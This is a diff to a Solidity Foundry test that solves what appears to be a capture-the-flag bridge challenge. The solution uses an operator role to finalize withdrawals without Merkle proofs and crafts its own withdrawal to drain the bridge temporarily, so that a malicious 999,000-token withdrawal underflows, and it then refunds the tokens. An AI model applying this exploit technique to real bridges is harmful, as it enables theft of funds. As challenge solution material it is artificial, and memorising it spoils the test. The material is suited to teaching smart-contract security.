@@ -89,53 +89,59 @@ contract WithdrawalChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_withdrawal() public checkSolvedByPlayer {
-        // The player holds OPERATOR_ROLE, so L1Gateway.finalizeWithdrawal() skips
-        // Merkle-proof verification for us (L1Gateway.sol:47-54). We only need to be
-        // past the 7-day delay, so warp forward once (covers every withdrawal).
+        // the player = OPERATOR_ROLE so can skip merkle proof verification and just warp 7 day delay.
         vm.warp(block.timestamp + l1Gateway.DELAY() + 1 days);
 
         bytes32[] memory noProof = new bytes32[](0);
         string memory logs = vm.readFile("test/withdrawal/withdrawals.json");
 
-        // --- 1) Finalize the 3 legitimate withdrawals (indexes 0,1,3), 10 DVT each. ---
-        _finalizeLog(logs, 0, noProof);
-        _finalizeLog(logs, 1, noProof);
-        _finalizeLog(logs, 3, noProof);
+        // 1) Finalize the 3 legitimate withdrawals (indexes 0,1,3), 10 DVT each.
+        // Log layout: topics[1]=nonce, topics[2]=l2Sender(L2Handler), topics[3]=target(L1Forwarder),
+        //             data=abi.encode(bytes32 id, uint256 timestamp, bytes message).
+        uint256[3] memory legit = [uint256(0), 1, 3];
+        for (uint256 j = 0; j < legit.length; j++) {
+            (, uint256 timestamp, bytes memory message) = abi.decode(
+                vm.parseJsonBytes(logs, string.concat("[", vm.toString(legit[j]), "].data")),
+                (bytes32, uint256, bytes)
+            );
+            l1Gateway.finalizeWithdrawal(
+                uint256(vm.parseJsonBytes32(logs, string.concat("[", vm.toString(legit[j]), "].topics[1]"))),
+                l2Handler,
+                address(l1Forwarder),
+                timestamp,
+                message,
+                noProof
+            );
+        }
 
-        // --- 2) The malicious withdrawal (index 2) pulls 999,000 DVT and would drain the
-        //        bridge. As operator, first move the bridge's funds out of reach via our own
-        //        crafted withdrawal, so the malicious one's `totalDeposits -= 999_000e18`
-        //        underflows and reverts. finalizeWithdrawal records the leaf BEFORE the call
-        //        and ignores its success (L1Gateway.sol:59-69), so it is still "finalized". ---
+        // 2) The malicious withdrawal (index 2) pulls 999,000 DVT and would drain the bridge.
+        //        so we first move the bridge's funds out of reach via our own crafted withdrawal
+        //        making `totalDeposits -= 999_000e18` underflows and reverts.
+        //        finalizeWithdrawal records the leaf before the call and ignores its success so it is still finalized.
         uint256 drain = 999_000e18;
         bytes memory inner = abi.encodeWithSignature("executeTokenWithdrawal(address,uint256)", player, drain);
         bytes memory fwd = abi.encodeWithSignature(
             "forwardMessage(uint256,address,address,bytes)", uint256(1000), player, address(l1TokenBridge), inner
         );
-        // l2Sender = l2Handler so L1Forwarder's xSender check passes (L1Forwarder.sol:46).
+        // l2Sender = l2Handler so L1Forwarder's xSender check passes.
         l1Gateway.finalizeWithdrawal(1000, l2Handler, address(l1Forwarder), START_TIMESTAMP, fwd, noProof);
 
-        // --- 3) Finalize the malicious withdrawal: its inner transfer now fails (underflow),
-        //        so it is marked finalized but moves 0 tokens. ---
-        _finalizeLog(logs, 2, noProof);
+        // 3) Finalize the malicious withdrawal (index 2). its inner transfer now fails (underflow) so it is marked finalized but moves 0 tokens.
+        {
+            (, uint256 timestamp, bytes memory message) =
+                abi.decode(vm.parseJsonBytes(logs, "[2].data"), (bytes32, uint256, bytes));
+            l1Gateway.finalizeWithdrawal(
+                uint256(vm.parseJsonBytes32(logs, "[2].topics[1]")),
+                l2Handler,
+                address(l1Forwarder),
+                timestamp,
+                message,
+                noProof
+            );
+        }
 
-        // --- 4) Return the temporarily-drained tokens to the bridge (player ends with 0). ---
+        // 4) Return the temporarily-drained tokens to the bridge (player ends with 0).
         token.transfer(address(l1TokenBridge), drain);
-
-        // this is why the exploit works: L1Gateway.finalizeWithdrawal() lets an operator skip Merkle-proof verification 
-        //and marks each withdrawal finalized before the token call while ignoring whether it succeeds so the attacker drains the bridge 
-        //with a self-crafted withdrawal first, making the malicious 999k withdrawal underflow-revert (still recorded, but moving nothing), then refunds the bridge
-    }
-
-    /// Replays one published L2 withdrawal log through finalizeWithdrawal (operator, no proof).
-    /// Log layout: topics[1]=nonce, topics[2]=l2Sender(L2Handler), topics[3]=target(L1Forwarder),
-    ///             data=abi.encode(bytes32 id, uint256 timestamp, bytes message).
-    function _finalizeLog(string memory logs, uint256 i, bytes32[] memory noProof) private {
-        string memory base = string.concat("[", vm.toString(i), "]");
-        uint256 nonce = uint256(vm.parseJsonBytes32(logs, string.concat(base, ".topics[1]")));
-        bytes memory data = vm.parseJsonBytes(logs, string.concat(base, ".data"));
-        (, uint256 timestamp, bytes memory message) = abi.decode(data, (bytes32, uint256, bytes));
-        l1Gateway.finalizeWithdrawal(nonce, l2Handler, address(l1Forwarder), timestamp, message, noProof);
     }
 
     /**
